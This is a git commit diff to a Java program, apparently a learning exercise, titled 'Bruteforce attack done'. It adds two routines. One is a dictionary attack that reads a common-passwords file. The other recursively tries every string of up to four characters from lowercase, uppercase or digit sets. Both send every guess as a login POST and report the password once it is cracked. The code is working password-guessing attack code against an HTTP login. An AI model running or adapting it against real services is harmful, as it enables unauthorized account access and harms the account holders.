1785a7af96a0fa0eef017fc95cf9b91d70fc9681
Richard Davidsson <r-1chard@hotmail.com>
2023-08-29 11:44:35 +0200

    Bruteforce attack done

--- src/Main.java
+++ src/Main.java
@@ -1,9 +1,11 @@
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
+import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Random;
+import java.util.Scanner;
+import java.util.concurrent.ThreadLocalRandom;
 
 public class Main {
 
@@ -47,11 +49,74 @@ public class Main {
         return "wtf happened?";
     }
 
-    private static void MrBrute(){
+    private static List<String> getPasswordList() throws FileNotFoundException {
 
+        File file = new File("src/commonPasswords.txt");
+        Scanner scanner = new Scanner(new FileReader(file));
+        List<String> passwordList = new ArrayList<>();
+        while (scanner.hasNextLine()) {
+            passwordList.add(scanner.nextLine());
+        }
+        return passwordList;
+    }
+
+    private static boolean MrBrutesDictionary() throws IOException {
+        List<String> passwordList = getPasswordList();
+        String response;
+
+        for (String p : passwordList) {
+            response = sendPOST(username, p);
+            count++;
+            System.out.println("TRIED: " + p + " - COUNT: " + count);
+            if (response.equals("success")) {
+                System.out.println("Password is: " + p + "\nAnd it took :" + count + " times");
+                return true;
+            }
+        }
+        System.out.println("Cannot crack password");
+        return false;
+    }
+
+    private static boolean msBrute(String testWord, String chars) throws IOException {
+
+        if(testWord.length() < 4) {
+
+            for (int i = 0; i < chars.length(); i++){
+                char cha = chars.charAt(i);
+                String currentWordTested = testWord + cha;
+                count++;
+
+                System.out.println("TRIED: " + currentWordTested + " - COUNT: " + count);
+                if(sendPOST(username,currentWordTested).equals("success")) {
+                    System.out.println("Password is: " + currentWordTested + "\nAnd it took :" + count + " times");
+                    return true;
+                }
+                if(msBrute(currentWordTested,chars)) {
+                    return true;
+                }
+            }
+        }
+        return false;
     }
 
     public static void main(String[] args) throws IOException {
-        sendPOST("dude","dude");
+        String lowerCase = "abcdefghijklmnopqrstuvwxyz";
+        String upperCase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        String numbers = "1234567890";
+
+        /*
+        if (MrBrutesDictionary()){
+            System.exit(0);
+        }*/
+        if (msBrute("", lowerCase)){
+            System.exit(0);
+        }
+        if (msBrute("", upperCase)){
+            System.exit(0);
+        }
+        if (msBrute("", numbers)){
+            System.exit(0);
+        }
     }
+
 }
